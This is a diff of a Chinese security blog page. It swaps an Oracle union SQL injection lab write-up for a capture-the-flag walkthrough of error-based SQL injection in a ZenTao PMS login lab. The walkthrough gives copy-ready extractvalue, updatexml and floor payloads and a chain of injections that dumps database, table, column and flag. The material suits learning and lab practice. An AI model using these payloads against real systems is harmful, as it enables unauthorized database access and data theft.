@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html><head>
-<title>Oracle 联合注入</title>
+<title>禅道 PMS 用户登录存在 SQL 注入</title>
 
 
 
@@ -10,26 +10,26 @@
 <meta name="google-site-verification" content="">
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
 <meta content="telephone=no" name="format-detection">
-<meta name="description" content="靶场演示">
+<meta name="description" content="登录页面用户名处输入恶意语句，抓包可以看到利用语法报错外带的数据库信息">
 <meta name="renderer" content="webkit">
 <meta name="theme-color" content="#ffffff">
 
 
 
-<meta property="og:title" content="Oracle 联合注入" />
-<meta property="og:description" content="靶场演示" />
+<meta property="og:title" content="禅道 PMS 用户登录存在 SQL 注入" />
+<meta property="og:description" content="登录页面用户名处输入恶意语句，抓包可以看到利用语法报错外带的数据库信息" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/sqli2/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-02-02T00:00:00+00:00" />
-<meta property="article:modified_time" content="2024-02-02T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />
+<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/sqli6/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-02-19T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />
 
 
 
 
 
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Oracle 联合注入"/>
-<meta name="twitter:description" content="靶场演示"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="禅道 PMS 用户登录存在 SQL 注入"/>
+<meta name="twitter:description" content="登录页面用户名处输入恶意语句，抓包可以看到利用语法报错外带的数据库信息"/>
 
 
 
@@ -137,6 +137,125 @@
             <div class="toc">
 
 
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e8%af%ad%e6%b3%95%e6%8a%a5%e9%94%99" class="nav-语法报错">
+									语法报错
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#extractvalue" class="nav-extractvalue">
+									extractvalue()
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#updatexml" class="nav-updatexml">
+									updatexml()
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#floor" class="nav-floor">
+									floor()
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b" class="nav-攻击流程">
+									攻击流程
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
 </div>
             
         </div>
@@ -187,16 +306,16 @@
                 
             >
                 <div class="post-title">
-                    Oracle 联合注入
+                    禅道 PMS 用户登录存在 SQL 注入
                     
                     <div class="post-subtitle">
-                        靶场演示
+                        登录页面用户名处输入恶意语句，抓包可以看到利用语法报错外带的数据库信息
                     </div>
                     
                     <div class="post-meta">
                         
                         <time itemprop="datePublished">
-                            2024-02-02 00:00
+                            2024-02-19 00:00
                         </time>
                         
 
@@ -225,40 +344,37 @@
                 
                 <div class="post-body" v-pre>
                 
-                    <p>靶场界面如下。</p>
-<p><img src="/images/sqli1/sqli2-0.png" alt="sqli2"></p>
-<p>我们先确认一下参数 id 处存在注入点。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' or '1'='1
+                    <h2 id="语法报错">语法报错</h2>
+<p>下述 payload 可以直接复制使用。</p>
+<h3 id="extractvalue">extractvalue()</h3>
+<pre><code>1' and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and '1'='1
 </code></pre>
-<p><img src="/images/sqli1/sqli2-1.png" alt="sqli2"></p>
-<p>当输入 order by 6 时报错，而 order by 5 不报错，确认字段数为 5。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' order by 6 --+
+<h3 id="updatexml">updatexml()</h3>
+<pre><code>1' and updatexml(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) and '1'='1
 </code></pre>
-<p><img src="/images/sqli1/sqli2-2.png" alt="sqli2"></p>
-<p>我们现在就可以用联合查询进行注入了。这里需要注意 oracle 的语法，from dual 是占位置用的，因为 oracle 的语句必须包含表名；我们使用 null 而不是 12345 是因为数据类型未知。</p>
-<p>先确认一下没有报错。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select null,null,null,null,null from dual --+
+<h3 id="floor">floor()</h3>
+<pre><code>1' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
 </code></pre>
-<p>然后确认回显点的数据类型，我们只需要一个回显点就够了。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select 1,'a',null,null,null from dual --+
+<h2 id="攻击流程">攻击流程</h2>
+<p>打开靶场看到如下页面。在输入随机用户名密码之后会出现弹窗，告诉我们密码有误。但是输入单引号之后，页面没有任何变化。没有出现弹窗说明单引号起作用了，这提示我们存在 sql 注入点。我们用 burp 抓包发现虽然浏览器里面的页面没有显示报错，但是 burp 里面可以看到语法报错。后面走走流程就可以拿到 flag。</p>
+<p><img src="/images/sqli1/sqli6-3.png" alt="sqli6"></p>
+<p>构造如下 payload。</p>
+<pre><code>1' and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and '1'='1
+
+1' and extractvalue(1,concat(0x5c,0x7e,(select table_name from information_schema.tables where table_schema='zentao' limit 0,1),0x7e)) and '1'='1
+
+1' and extractvalue(1,concat(0x5c,0x7e,(select column_name from information_schema.columns where table_schema='zentao' and table_name='flag' limit 0,1),0x7e)) and '1'='1
+
+1' and extractvalue(1,concat(0x5c,0x7e,(select flag from zentao.flag),0x7e)) and '1'='1
 </code></pre>
-<p><img src="/images/sqli1/sqli2-3.png" alt="sqli2"></p>
-<p>现在我们使用 oracle 的自带库。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select 1,table_name,null,null,null from user_all_tables --+
-</code></pre>
-<p><img src="/images/sqli1/sqli2-4.png" alt="sqli2"></p>
-<p>我们找到了 flag 的表，进一步查询字段。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select 1,column_name,null,null,null from all_tab_columns where table_name='UNION_FLAG' --+
-</code></pre>
-<p><img src="/images/sqli1/sqli2-5.png" alt="sqli2"></p>
-<p>至此我们就找到了 flag。</p>
-<pre><code>http://111.9.41.91:53109/?id=1' union select 1,FLAG,null,null,null from UNION_FLAG --+
-</code></pre>
-<p><img src="/images/sqli1/sqli2-6.png" alt="sqli2"></p>
+<p>最终拿到 flag=ywaq{sql-ywaqnb-bczr}。上述 payload 效果如下。</p>
+<p><img src="/images/sqli1/sqli6-0.png" alt="sqli6"></p>
+<p><img src="/images/sqli1/sqli6-1.png" alt="sqli6"></p>
+<p><img src="/images/sqli1/sqli6-2.png" alt="sqli6"></p>
 
                     
                     <HR width="100%" id="EOF">
-		    <p style="color:#777;">Last modified on 2024-02-02</p>
+		    <p style="color:#777;">Last modified on 2024-02-19</p>
                     
                 </div>
             </div>
@@ -267,14 +383,14 @@
             <nav class="post-pagination">
 
                 
-                <a class="newer-posts" href="/posts/sec/kalinetwork/">
-			Next<br>Kali Linux 网络设置
+                <a class="newer-posts" href="/posts/sec/sqli7/">
+			Next<br>中环 CMS 主页面存在 SQL 注入
                 </a>
                 
                 
                 
-                <a class="older-posts" href="/posts/sec/sqli1/">
-			Previous<br>MySQL 联合注入
+                <a class="older-posts" href="/posts/sec/sqli5/">
+			Previous<br>Blue CMS v1.6 留言区存在 XFF 伪造漏洞
                 </a>
                 
             </nav>
@@ -348,6 +464,125 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
         
         <div class="toc">
 
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e8%af%ad%e6%b3%95%e6%8a%a5%e9%94%99" class="nav-语法报错">
+									语法报错
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#extractvalue" class="nav-extractvalue">
+									extractvalue()
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#updatexml" class="nav-updatexml">
+									updatexml()
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#floor" class="nav-floor">
+									floor()
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b" class="nav-攻击流程">
+									攻击流程
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
 
 </div>
         
